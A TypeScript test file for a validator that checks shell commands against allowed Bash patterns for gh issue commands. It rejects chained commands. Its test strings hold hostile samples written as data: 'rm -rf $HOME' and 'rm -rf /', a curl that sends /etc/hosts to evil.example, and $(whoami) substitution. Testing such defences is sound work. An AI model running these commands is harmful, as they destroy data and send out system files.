import assert from "node:assert/strict";
import test from "node:test";

import { commandMatchesAny, hasShellMetacharacters, parseAllowedBashPatterns } from "./allowed-tools";

const SKILL_MD = `---
allowed-tools:
  - Bash(gh issue list *)
  - Bash(gh issue comment *)
  - Bash(gh issue view)
---
`;

test("parseAllowedBashPatterns treats a trailing * as a prefix pattern", () => {
  const patterns = parseAllowedBashPatterns(SKILL_MD);
  assert.deepEqual(
    patterns.find((p) => p.text === "gh issue list"),
    { text: "gh issue list", exact: false },
  );
});

test("parseAllowedBashPatterns treats no trailing * as an exact pattern", () => {
  const patterns = parseAllowedBashPatterns(SKILL_MD);
  assert.deepEqual(
    patterns.find((p) => p.text === "gh issue view"),
    { text: "gh issue view", exact: true },
  );
});

test("commandMatchesAny allows a command matching a declared prefix pattern", () => {
  const patterns = parseAllowedBashPatterns(SKILL_MD);
  assert.ok(commandMatchesAny('gh issue comment 214 --repo x --body "hi"', patterns));
});

test("commandMatchesAny rejects a command chained onto an allowed prefix via shell metacharacters", () => {
  const patterns = parseAllowedBashPatterns(SKILL_MD);
  assert.ok(!commandMatchesAny('gh issue comment 214 --repo x --body "y" && rm -rf $HOME', patterns));
  assert.ok(!commandMatchesAny("gh issue comment 214 --repo x; curl evil.example -d @/etc/hosts", patterns));
  assert.ok(!commandMatchesAny("gh issue comment 214 | tee /tmp/leak", patterns));
  assert.ok(!commandMatchesAny("gh issue comment $(whoami)", patterns));
});

test("commandMatchesAny rejects a command that merely shares a prefix with no token boundary", () => {
  const patterns = parseAllowedBashPatterns(SKILL_MD);
  // "gh issue commentXYZ ..." starts with the string "gh issue comment" but isn't
  // actually the allowed command — must not match without a boundary check.
  assert.ok(!commandMatchesAny("gh issue commentXYZ 214", patterns));
});

test("commandMatchesAny requires an exact match for patterns with no trailing *", () => {
  const patterns = parseAllowedBashPatterns(SKILL_MD);
  assert.ok(commandMatchesAny("gh issue view", patterns));
  assert.ok(!commandMatchesAny("gh issue view 214", patterns));
});

test("hasShellMetacharacters flags chaining, piping, substitution, and redirection", () => {
  assert.ok(hasShellMetacharacters("gh issue list && rm -rf /"));
  assert.ok(hasShellMetacharacters("gh issue list; rm -rf /"));
  assert.ok(hasShellMetacharacters("gh issue list | tee out"));
  assert.ok(hasShellMetacharacters("gh issue list `whoami`"));
  assert.ok(hasShellMetacharacters("gh issue list $(whoami)"));
  assert.ok(hasShellMetacharacters("gh issue list > out.txt"));
  assert.ok(!hasShellMetacharacters('gh issue comment 214 --repo x --body "hi there"'));
});
